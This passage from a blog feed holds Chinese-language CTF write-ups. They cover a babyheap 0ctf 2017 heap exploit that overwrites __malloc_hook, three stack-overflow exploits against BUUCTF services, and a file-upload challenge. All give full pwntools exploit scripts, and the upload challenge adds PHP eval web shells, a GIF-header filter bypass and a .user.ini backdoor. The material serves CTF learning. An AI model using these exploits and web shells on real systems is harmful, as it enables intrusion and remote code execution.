attack详解</a><br>首先把重复操作封装成函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data</code></pre><p>在本题中，按照攻击思想，首先alloc4个堆</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span></code></pre><p>alloc0x18实际上分配了0x20大小的堆，alloc0x68实际上分配了0x70大小的堆<br>然后我们fill0号堆，造成单字节溢出，即溢出到1号堆的size位，修改size为size(1)+size(2)，即0xe1(1为上一个堆是否处于分配状态的标志位)</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>这样1号堆实际上就包括了1号堆和2号堆，属于small chunk.接下来我们free1号堆，当1号堆被free之后，按照规定会被放入unsorted bin当中，大小为0xe1,此时1号堆的fd和bk指针都存放着unsorted bin的表头<br>(需要注意，free掉1号堆后，实际上2号堆仍然处于已分配状态)<br>然后我们再alloc一个大小为0x60的堆，这样就从unsorted bin当中割除一块，即割除了原本属于1号堆的那一块分配给了新堆，剩下的那一块就是属于2号堆的那一块，unsorted bin的表头的转移到了2号堆的fd和bk当中<br>而2号堆仍然处于使用状态，这样我们就可以通过dump操作泄露出libc</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt=""><br>偏移为0x7f5a68c3db78-0x7f5a68879000=0x3C4B78‬</p><pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span></code></pre><p>泄露出libc地址后，利用就已经完成了一大半了<br>由于开启了Full RELRO，复写got表就不可行了，我们这里可通过覆盖__malloc_hook指针为one_gadget来起shell</p><pre class=" language-bash"><code class="language-bash">malloc_hook最常见也是最容易的一种堆利用方法。malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转通过fastbin_attack攻击malloc_hook</code></pre><p>观察一下malloc_hook周围的数据的分布<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt=""><br>似乎并没有满足条件fastbin条件的数据，但只要我们稍微调整一下数据分布，看到__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt=""><br>7f正好满足fastbin大小的限制，如图所示<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt=""><br>补充好相应的知识以后，就可以开始构造了<br>我们再alloc一个0x60大小的4号堆，实际上4号堆和2号堆是公用的<br>然后free掉2号堆，这个时候bins如下<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt=""><br>我们再通过fill4号堆把2号堆的fd指针指向mallac_hook-0x23处</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>看看现在的bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt=""><br>指向了<strong>malloc_hook-0x23处，我们只需要alloc2次，就能把堆分配到</strong>malloc_hook-0x23</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></code></pre><p>接下来就只需要按照上面关于的<strong>malloc_hook的图进行填充即可，把one_gadget的地址填入</strong>malloc_hook处，然后再alloc任意大小的堆即可触发one_gadget从而拿到shell</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap_0ctf_2017'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote('node3.buuoj.cn',29849)</span><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dataalloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt=""><br>成功</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆 </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> chunk extend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF pwn1_sctf_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32位程序，开启栈不可执行<br>IDA分析，vuln函数和后门函数<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p><p>vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you<br>执行程序试一试<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>如我们所想一样<br>再看向缓冲区<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>gets允许输入32个字节，而s的缓冲区多达3C个字节，也就是相对于ebp有60个字节，则相对于eip有64个字节，正常输入的话无法造成缓冲区溢出<br>但结合程序会把’I’替换成’you’的效果来看，只要我们输入21个’I’，经过三倍字节替换后就会变成63个字节，再加上一个字节就能造成缓冲区溢出<br>所以可以写出exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./pwn1_sctf_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26405</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x08048f0d</span>payload <span class="token operator">=</span> <span class="token string">'I'</span><span class="token operator">*</span><span class="token number">20</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>成功读取flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup_csaw_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt=""><br>64位程序，没有保护<br>拖入IDA查看,F5大法<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt=""><br>同样有一个后门函数，这个后门函数直接读取flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt=""><br>所以做法和rip一样<br>直接贴exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./warmup_csaw_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27003</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x40060d</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/5.jpg" alt=""><br>成功读取flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF rip</title>
      <link href="/LawlietLW.github.io/2020/01/23/buuctf-rip/"/>
      <url>/LawlietLW.github.io/2020/01/23/buuctf-rip/</url>
      
        <content type="html"><![CDATA[<p>入门栈溢出题目，首先checksec一下<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/1.jpg" alt=""><br>64位程序，没有任何保护</p><a id="more"></a><p>拖入IDA查看,F5大法好<br>首先是main函数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/2.jpg" alt=""><br>还有一个后门函数fun()<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/3.jpg" alt=""><br>很明显,main函数中的gets存在溢出,接下来来确定溢出字节数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/4.jpg" alt=""><br>相对于EIP有23个字节<br>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./rip')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27031</span><span class="token punctuation">)</span>fun_addr <span class="token operator">=</span> <span class="token number">0x40118a</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">23</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/5.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF CheckIn</title>
      <link href="/LawlietLW.github.io/2019/12/23/buuctf-checkin/"/>
      <url>/LawlietLW.github.io/2019/12/23/buuctf-checkin/</url>
      
        <content type="html"><![CDATA[<p>打开环境，是一个文件上传页面<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/1.jpg" alt=""></p><a id="more"></a><p>先查看一下源代码，看看有没有客户端校验<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/7.jpg" alt=""><br>显然没有客户端校验<br>首先上传一个图片，检查上传功能<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/2.jpg" alt=""><br>图片正常上传<br>接下来再上传一个php文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/3.jpg" alt=""><br>提示非法后缀<br>那么应该是不能接受php后缀的文件了，我们把后缀改成jpg试一下<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/8.jpg" alt=""><br>我把content-type字段和后缀名都改了一下<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/9.jpg" alt=""><br>但依然无法上传，提示检测到了非法字符<br>那我们再把一句话换一种写法</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>继续上传<br>得到了这样的反馈<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/10.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">exif_imagetype<span class="token punctuation">(</span><span class="token punctuation">)</span> 读取一个图像的第一个字节并检查其签名。</code></pre><p>这里是有文件内容头校验<br>不同的图片形式的文件头如下</p><pre class=" language-bash"><code class="language-bash">JPG ：FF D8 FF E0 00 10 4A 46 49 46GIF<span class="token punctuation">(</span>相当于文本的GIF89a<span class="token punctuation">)</span>：47 49 46 38 39 61PNG： 89 50 4E 47</code></pre><p>给我们的shell加上GIF文件的文件头，继续上传<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/11.jpg" alt=""><br>上传成功<br>但上传成功了该如何利用呢，图片马需要有文件包含漏洞或者解析漏洞才能够利用，但这道题并没有相应的漏洞<br>接下来就是我从这道题里面学到的新姿势了<br>先贴上P牛的链接<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p><p>php.ini是php默认的配置文件，其中包括了很多php的配置<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/12.jpg" alt=""><br>而.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置<br>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件<br>所以，我们能轻易地用.user.ini文件构造出一个PHP后门<br>Php配置项中有两个比较有意思的项<br>auto_append_file、auto_prepend_file<br>其中auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数<br>auto_append_file则是在文件后面包含<br>也就是说，.user.ini文件相当于创造了文件包含的机会<br>用法也简单，直接写入.user.ini文件即可</p><p>所以，本题中，我们只需要先创建一个.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/13.jpg" alt=""><br>同样需要在.user.ini文件前加入GIF文件头<br>再创建一个图片马<br>可以使用copy命令</p><pre class=" language-bash"><code class="language-bash">copy shell.jpg/b+shell.php/a shell.jpg</code></pre><p>也可以使用一个叫edjpgcom的工具来生成图片马</p><p>首先上传我们的.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/14.jpg" alt=""><br>然后上传图片马<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/15.jpg" alt=""><br>访问一下上传的位置<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/16.jpg" alt=""><br>蚁剑连接<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/17.jpg" alt=""><br>成功拿到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            